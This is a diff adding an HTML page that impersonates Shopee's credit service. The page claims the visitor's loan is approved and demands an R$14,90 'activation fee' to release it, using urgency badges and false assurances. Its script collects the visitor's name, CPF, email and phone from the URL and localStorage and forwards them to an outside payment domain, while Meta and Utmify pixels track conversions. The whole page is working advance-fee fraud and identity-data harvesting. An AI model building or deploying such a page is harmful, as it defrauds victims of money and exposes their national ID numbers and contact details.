@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ativação da Conta Digital | SCrédito Shopee</title>
+
+<!-- Meta Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '913651397584478');
+  fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=913651397584478&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+ 
+  <script>
+    localStorage.setItem("upsell", "up11");
+  </script>
+    
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+  <script>
+    window.pixelId = "682f4a0b17362a4244bf5d3c";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            shopee: {
+              light: "#ff7337",
+              DEFAULT: "#ee4d2d",
+              dark: "#d5331a",
+            },
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background-color: #f6f6f6;
+      margin: 0;
+      padding: 0;
+    }
+
+    .shopee-gradient {
+      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+    }
+
+    .card-container {
+      max-width: 448px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background-color: white;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1rem;
+      border-bottom: 1px solid #e2e8f0;
+      background-color: white;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .logo-section {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo {
+      height: 32px;
+    }
+
+    .brand-text {
+      margin-left: 0.5rem;
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #ee4d2d;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      font-size: 0.875rem;
+    }
+
+    .user-name {
+      display: flex;
+      align-items: center;
+      font-weight: 500;
+      color: #1f2937;
+    }
+
+    .user-name i {
+      color: #ee4d2d;
+      margin-right: 0.25rem;
+    }
+
+    .user-cpf {
+      font-size: 0.75rem;
+      color: #6b7280;
+    }
+
+    .content {
+      padding: 1.25rem;
+    }
+
+    .status-card {
+      background: white;
+      border-radius: 16px;
+      padding: 1.5rem;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+      margin-bottom: 1.5rem;
+    }
+
+    .activation-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #f59e0b 0%, #fbbf24 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1rem;
+      animation: pulse 2s infinite;
+    }
+
+    .activation-icon i {
+      color: white;
+      font-size: 2rem;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.7);
+      }
+      50% {
+        box-shadow: 0 0 0 10px rgba(245, 158, 11, 0);
+      }
+    }
+
+    .title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #1f2937;
+      text-align: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .subtitle {
+      color: #6b7280;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      line-height: 1.6;
+    }
+
+    .amount {
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: #ee4d2d;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+
+    .info-grid {
+      display: grid;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.75rem 0;
+      border-bottom: 1px solid #f3f4f6;
+      font-size: 0.95rem;
+    }
+
+    .info-row:last-child {
+      border-bottom: none;
+    }
+
+    .info-label {
+      color: #6b7280;
+      font-weight: 500;
+    }
+
+    .info-value {
+      color: #1f2937;
+      font-weight: 600;
+    }
+
+    .activation-fee {
+      background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+      border: 2px solid #f59e0b;
+      border-radius: 12px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+      text-align: center;
+    }
+
+    .fee-amount {
+      font-size: 2rem;
+      font-weight: 800;
+      color: #92400e;
+      margin-bottom: 0.5rem;
+    }
+
+    .fee-description {
+      font-size: 0.9rem;
+      color: #78350f;
+      font-weight: 500;
+    }
+
+    .alert-info {
+      background-color: #dbeafe;
+      border-left: 4px solid #3b82f6;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      color: #1e40af;
+    }
+
+    .alert-success {
+      background-color: #d1fae5;
+      border-left: 4px solid #10b981;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      color: #047857;
+      font-weight: 500;
+    }
+
+    .button-primary {
+      width: 100%;
+      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 1rem;
+      font-size: 1.125rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .button-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(238, 77, 45, 0.3);
+    }
+
+    .button-primary:active {
+      transform: translateY(0);
+    }
+
+    .btn-shine {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-shine:after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to right,
+        rgba(255, 255, 255, 0) 0%,
+        rgba(255, 255, 255, 0.3) 50%,
+        rgba(255, 255, 255, 0) 100%
+      );
+      transform: rotate(30deg);
+      animation: shine 4s infinite;
+    }
+
+    @keyframes shine {
+      0% { left: -100%; opacity: 0; }
+      10% { left: 100%; opacity: 0.6; }
+      100% { left: 100%; opacity: 0; }
+    }
+
+    .urgency-badge {
+      background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
+      color: white;
+      padding: 0.5rem 1rem;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      display: inline-block;
+      margin-bottom: 1rem;
+      animation: blink 2s infinite;
+    }
+
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0.7; }
+    }
+
+    .benefit-list {
+      background: #f9fafb;
+      border-radius: 12px;
+      padding: 1rem;
+      margin: 1.5rem 0;
+    }
+
+    .benefit-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 0.75rem;
+      font-size: 0.9rem;
+      color: #374151;
+    }
+
+    .benefit-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .benefit-item i {
+      color: #10b981;
+      margin-right: 0.75rem;
+      font-size: 1rem;
+    }
+
+    .flex { display: flex; }
+    .items-center { align-items: center; }
+    .justify-center { justify-content: center; }
+    .mr-2 { margin-right: 0.5rem; }
+    .mb-4 { margin-bottom: 1rem; }
+  </style>
+</head>
+<body>
+  <div class="card-container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo-section">
+        <img src="../4/images/2560px-Shopee_logo.svg.png" alt="Shopee Logo" class="logo">
+        <span class="brand-text">SCrédito</span>
+      </div>
+      <div class="user-info">
+        <div class="user-name">
+          <i class="fas fa-user-circle"></i>
+          <span id="user-display-name">Carregando...</span>
+        </div>
+        <div class="user-cpf" id="user-display-cpf">Carregando...</div>
+      </div>
+    </div>
+
+    <!-- Conteúdo principal -->
+    <div class="content">
+      <div class="status-card">
+        <div class="urgency-badge">
+          <i class="fas fa-clock mr-2"></i>
+          AÇÃO NECESSÁRIA
+        </div>
+
+        <div class="activation-icon">
+          <i class="fas fa-key"></i>
+        </div>
+        
+        <h1 class="title">Taxa de Ativação da Conta Digital</h1>
+        <p class="subtitle">
+          Seu crédito já foi recebido na sua conta Shopee. Para ativar a conta virtual e começar a usar seu dinheiro agora mesmo, é necessário pagar uma taxa de ativação.
+        </p>
+        
+        <div class="amount">R$14,90</div>
+
+        <div class="alert-success">
+          <div class="flex items-center">
+            <i class="fas fa-shield-alt mr-2"></i>
+            <div>
+              <strong>Importante:</strong> Essa taxa não é para a gente — ela será adicionada como saldo da sua conta e poderá ser usada junto com o valor que você já tem liberado.
+            </div>
+          </div>
+        </div>
+
+        <div class="benefit-list">
+          <div class="benefit-item">
+            <i class="fas fa-check-circle"></i>
+            <span>Taxa convertida em saldo utilizável</span>
+          </div>
+          <div class="benefit-item">
+            <i class="fas fa-check-circle"></i>
+            <span>Ativação imediata da conta digital</span>
+          </div>
+          <div class="benefit-item">
+            <i class="fas fa-check-circle"></i>
+            <span>Acesso total ao seu crédito liberado</span>
+          </div>
+          <div class="benefit-item">
+            <i class="fas fa-check-circle"></i>
+            <span>Sem taxas mensais ou anuidades</span>
+          </div>
+        </div>
+
+        <div class="info-grid">
+          <div class="info-row">
+            <span class="info-label">Status da conta</span>
+            <span class="info-value" style="color: #f59e0b; font-weight: 700;">Aguardando ativação</span>
+          </div>
+        </div>
+
+        <div class="alert-info">
+          <div class="flex items-center">
+            <i class="fas fa-info-circle mr-2"></i>
+            <span>Após o pagamento, sua conta será ativada automaticamente e você terá acesso imediato ao valor total.</span>
+          </div>
+        </div>
+
+        <button class="button-primary btn-shine" onclick="ativarConta()">
+          <i class="fas fa-unlock mr-2"></i>
+          Ativar Minha Conta Agora
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    
+    // Função para salvar dados importantes no localStorage
+    function salvarDadosLocalStorage(nome, cpf, valorEmprestimo) {
+      if (nome && nome.trim() !== "") {
+        localStorage.setItem("userNome", nome);
+      }
+      if (cpf && cpf.trim() !== "") {
+        localStorage.setItem("userCpf", cpf);
+      }
+      if (valorEmprestimo && valorEmprestimo.trim() !== "") {
+        localStorage.setItem("userValorEmprestimo", valorEmprestimo);
+      }
+    }
+
+    // Função para recuperar dados do localStorage
+    function recuperarDadosLocalStorage() {
+      return {
+        nome: localStorage.getItem("userNome") || localStorage.getItem("nomeUsuario") || "",
+        cpf: localStorage.getItem("userCpf") || localStorage.getItem("cpfUsuario") || "",
+        valorEmprestimo: localStorage.getItem("userValorEmprestimo") || "",
+        dataNascimento: localStorage.getItem("userDataNascimento") || "",
+        nomeMae: localStorage.getItem("userNomeMae") || "",
+        sexo: localStorage.getItem("userSexo") || ""
+      };
+    }
+    
+    // Função para recuperar dados completos da API se disponíveis
+    function recuperarDadosAPI() {
+      const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+      if (dadosUsuarioJSON) {
+        try {
+          return JSON.parse(dadosUsuarioJSON);
+        } catch (error) {
+          console.error("Erro ao fazer parse dos dados da API:", error);
+          return null;
+        }
+      }
+      return null;
+    }
+    
+    // Capturar dados dos parâmetros da URL
+    let nome = params.get("nome") || params.get("name") || params.get("usuario") || "";
+    let cpf = params.get("cpf") || params.get("document") || "";
+    let valorEmprestimo = params.get("valor_emprestimo") || params.get("valor_aprovado") || "";
+    
+    // Se algum dado estiver vazio, tentar recuperar do localStorage
+    const dadosLocalStorage = recuperarDadosLocalStorage();
+    const dadosAPI = recuperarDadosAPI();
+    
+    // Priorizar dados da API se disponíveis
+    if (!nome || nome.trim() === "") {
+      if (dadosAPI && dadosAPI.nome) {
+        nome = dadosAPI.nome;
+        console.log("Nome recuperado da API:", nome);
+      } else if (dadosLocalStorage.nome) {
+        nome = dadosLocalStorage.nome;
+        console.log("Nome recuperado do localStorage:", nome);
+      }
+    }
+    
+    // Se ainda não tiver nome válido, usar valor padrão
+    if (!nome || nome.trim() === "") {
+      nome = "Usuário";
+    }
+    
+    if (!cpf || cpf.trim() === "") {
+      if (dadosAPI && dadosAPI.cpf) {
+        cpf = dadosAPI.cpf;
+        console.log("CPF recuperado da API:", cpf);
+      } else if (dadosLocalStorage.cpf) {
+        cpf = dadosLocalStorage.cpf;
+        console.log("CPF recuperado do localStorage:", cpf);
+      }
+    }
+    
+    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
+      valorEmprestimo = dadosLocalStorage.valorEmprestimo;
+      console.log("Valor do empréstimo recuperado do localStorage:", valorEmprestimo);
+    }
+    
+    // Salvar dados atuais no localStorage para uso futuro (garantir consistência)
+    salvarDadosLocalStorage(nome, cpf, valorEmprestimo);
+    
+    // Se temos dados da API, salvar também separadamente para compatibilidade
+    if (dadosAPI) {
+      if (dadosAPI.nome && !localStorage.getItem("nomeUsuario")) {
+        localStorage.setItem("nomeUsuario", dadosAPI.nome);
+      }
+      if (dadosAPI.cpf && !localStorage.getItem("cpfUsuario")) {
+        localStorage.setItem("cpfUsuario", dadosAPI.cpf);
+      }
+    }
+    
+    const email = params.get("email") || "";
+    const telefone = params.get("numero") || params.get("telephone") || params.get("telefone") || "";
+
+    // Debug: log dos parâmetros para verificação
+    console.log("=== UP11 - DEBUG DOS PARÂMETROS ===");
+    console.log("URL atual:", window.location.href);
+    console.log("Parâmetros da URL:", {
+      nome: params.get("nome") || params.get("name"),
+      cpf: params.get("cpf") || params.get("document"),
+      valorEmprestimo: params.get("valor_emprestimo") || params.get("valor_aprovado")
+    });
+    console.log("Dados do localStorage:", dadosLocalStorage);
+    console.log("Dados da API:", dadosAPI);
+    console.log("Dados finais utilizados:", {
+      nome: nome,
+      cpf: cpf,
+      email: email,
+      telefone: telefone,
+      valorEmprestimo: valorEmprestimo
+    });
+    console.log("Todos os parâmetros URL:", Object.fromEntries(params));
+    console.log("=====================================");
+
+    // Função para formatar valor monetário
+    function formatarValor(valor) {
+      const numero = parseFloat(valor.toString().replace(/[^\d.,]/g, '').replace(',', '.'));
+      if (isNaN(numero)) return "R$ 9.782,23";
+      return `R$ ${numero.toLocaleString('pt-BR', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      })}`;
+    }
+
+    // Função para calcular valor total (crédito + taxa)
+    function calcularValorTotal(valorCredito) {
+      const numeroCredito = parseFloat(valorCredito.toString().replace(/[^\d.,]/g, '').replace(',', '.'));
+      const taxaAtivacao = 14.90;
+      const total = numeroCredito + taxaAtivacao;
+      return `R$ ${total.toLocaleString('pt-BR', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      })}`;
+    }
+
+    function formatCPF(cpf) {
+      const clean = cpf.replace(/\D/g, "");
+      return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    // Obter valor formatado do empréstimo (usando o valor exato digitado pelo usuário)
+    const valorFormatado = formatarValor(valorEmprestimo);
+
+    // Atualizar informações do usuário
+    document.addEventListener('DOMContentLoaded', function() {
+      // Disparar ViewContent quando a página carregar
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'ViewContent', {
+          content_type: 'page',
+          content_category: 'ativacao_conta'
+        });
+      }
+
+      // Função para atualizar dados na tela com fallbacks robustos
+      function atualizarDadosNaTela() {
+        // Obter dados mais recentes
+        const dadosRecentes = recuperarDadosLocalStorage();
+        const dadosAPIRecentes = recuperarDadosAPI();
+        
+        // Determinar nome final com prioridade para API
+        let nomeFinal = nome;
+        if (dadosAPIRecentes && dadosAPIRecentes.nome) {
+          nomeFinal = dadosAPIRecentes.nome;
+        } else if (dadosRecentes.nome) {
+          nomeFinal = dadosRecentes.nome;
+        }
+        
+        // Determinar CPF final com prioridade para API
+        let cpfFinal = cpf;
+        if (dadosAPIRecentes && dadosAPIRecentes.cpf) {
+          cpfFinal = dadosAPIRecentes.cpf;
+        } else if (dadosRecentes.cpf) {
+          cpfFinal = dadosRecentes.cpf;
+        }
+
+        // Garantir que os elementos existem antes de tentar atualizar
+        const userDisplayName = document.getElementById("user-display-name");
+        const userDisplayCpf = document.getElementById("user-display-cpf");
+        const valorCreditoElement = document.getElementById("valor-credito");
+        const valorTotalElement = document.getElementById("valor-total");
+        
+        // Atualizar elementos se existirem
+        if (userDisplayName) userDisplayName.textContent = nomeFinal || "Usuário";
+        if (userDisplayCpf) userDisplayCpf.textContent = cpfFinal ? formatCPF(cpfFinal) : "***.***.***-**";
+        if (valorCreditoElement) valorCreditoElement.textContent = valorFormatado;
+        if (valorTotalElement) valorTotalElement.textContent = calcularValorTotal(valorEmprestimo);
+        
+        console.log("UP11 - Dados atualizados na tela:", {
+          nomeFinal: nomeFinal || "Usuário",
+          cpfFinal: cpfFinal ? formatCPF(cpfFinal) : "***.***.***-**",
+          valorFormatado: valorFormatado,
+          valorTotal: calcularValorTotal(valorEmprestimo),
+          fonte: dadosAPIRecentes ? "API + localStorage" : "localStorage"
+        });
+      }
+      
+      // Executar atualização inicial
+      atualizarDadosNaTela();
+    });
+    
+    // Atualização imediata (fallback caso DOMContentLoaded já tenha passado)
+    if (document.readyState === 'loading') {
+      // Página ainda carregando, aguardar DOMContentLoaded
+    } else {
+      // Página já carregada, atualizar imediatamente
+      setTimeout(() => {
+        const userDisplayName = document.getElementById("user-display-name");
+        const userDisplayCpf = document.getElementById("user-display-cpf");
+        const valorCreditoElement = document.getElementById("valor-credito");
+        const valorTotalElement = document.getElementById("valor-total");
+        
+        if (userDisplayName) userDisplayName.textContent = nome || "Carregando...";
+        if (userDisplayCpf) userDisplayCpf.textContent = cpf ? formatCPF(cpf) : "Carregando...";
+        if (valorCreditoElement) valorCreditoElement.textContent = valorFormatado;
+        if (valorTotalElement) valorTotalElement.textContent = calcularValorTotal(valorEmprestimo);
+      }, 100);
+    }
+
+    function ativarConta() {
+      // Disparar evento do Facebook Pixel
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'AddPaymentInfo', {
+          value: 14.90,
+          currency: 'BRL',
+          content_category: 'taxa_ativacao'
+        });
+      }
+
+      // URL de redirecionamento para pagamento da taxa
+      const urlBase = "https://pay.pagamentosfacilitadosoficial.shop/DYp0ZxVBYWkgmvX";
+      
+      // Criar parâmetros para o checkout
+      const checkoutParams = new URLSearchParams();
+      
+      // Adicionar parâmetros básicos
+      if (nome && nome.trim() !== "") {
+        checkoutParams.append("nome", nome);
+        checkoutParams.append("name", nome);
+      }
+      
+      if (cpf && cpf.trim() !== "") {
+        checkoutParams.append("cpf", cpf);
+        checkoutParams.append("document", cpf);
+      }
+      
+      if (email) {
+        checkoutParams.append("email", email);
+      }
+      
+      if (telefone) {
+        checkoutParams.append("telefone", telefone);
+        checkoutParams.append("telephone", telefone);
+        checkoutParams.append("numero", telefone);
+      }
+      
+      // Adicionar valor da taxa como produto
+      checkoutParams.append("produto", "taxa_ativacao");
+      checkoutParams.append("valor", "14.90");
+      checkoutParams.append("valor_credito", valorEmprestimo);
+      
+      // Adicionar todos os parâmetros originais da URL atual
+      const currentParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of currentParams) {
+        if (!checkoutParams.has(key)) {
+          checkoutParams.append(key, value);
+        }
+      }
+      
+      const finalUrl = `${urlBase}?${checkoutParams.toString()}`;
+      
+      console.log("Redirecionando para pagamento da taxa de ativação:", finalUrl);
+      
+      window.location.href = finalUrl;
+    }
+  </script>
+</body>
+</html>
